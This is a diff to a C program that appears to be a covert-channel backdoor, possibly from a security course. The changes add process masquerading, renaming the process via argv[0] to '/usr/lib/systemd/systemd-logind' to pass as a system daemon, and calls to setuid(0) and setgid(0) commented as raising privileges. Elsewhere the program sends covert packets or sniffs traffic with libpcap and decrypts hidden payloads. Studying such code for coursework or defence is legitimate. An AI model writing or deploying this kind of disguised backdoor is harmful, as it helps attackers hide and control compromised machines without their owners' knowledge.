@@ -6,6 +6,7 @@
 #define ADDRESS_LOCAL "192.168.1.3"
 #define PORT "8505"
 #define BUFFERSIZE 1024
+#define MASK "/usr/lib/systemd/systemd-logind"
 
 struct payload{
     char key[5]; // always 8505
@@ -29,27 +30,17 @@ int main(int argc, char **argv){
     unsigned short dport = 8505;
     unsigned char data[BUFSIZE] = "hello";
 
+    strcpy(argv[0], MASK);
+    //change the UID/GID to 0 to raise privs
+    setuid(0);
+    setgid(0);
 
     if(strcmp(argv[1],c) == 0){
-//        unsigned char encrypted[sizeof(struct payload)];
-//        char hello[BUFFERSIZE] = "hello";
-        //CreatePayload(hello, encrypted);
-        //SendPayload(encrypted);
         covert_send(sip, dip, dport, sport, data);
         exit(1);
     } else {
         Packetcapture();
     }
-
-    /*unsigned char *plaintext = (unsigned char *)"This is a test";
-    unsigned char decryptedtext[128];
-    unsigned char ciphertext[128];
-    int decryptedlen, cipherlen;
-    printf("Plaintext is: %s\n", plaintext);
-    cipherlen = encryptMessage(plaintext, strlen((char*)plaintext) + 1, key,iv, ciphertext);
-    printf("Ciphertext: %s\n",ciphertext);
-    decryptedlen = decryptMessage(ciphertext, cipherlen, key, iv, decryptedtext);
-    printf("Decrypted text is: %s \n", decryptedtext);*/
 
     return 0;
 }
@@ -182,14 +173,11 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
 }
 
 void ParsePayload(const u_char *payload, int len){
-    //decrypt payload
-    //parse the first x bytes for the key
-    //parse the rest into a struct
 
     unsigned char decryptedtext[BUFSIZE];
     int decryptedlen, cipherlen;
     cipherlen = strlen((char*)payload);
     printf("Encrypted Payload is: %s \n", payload);
-    decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, key, iv, decryptedtext);
+    decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
     printf("Encrypted Payload is: %s \n", decryptedtext);
 }
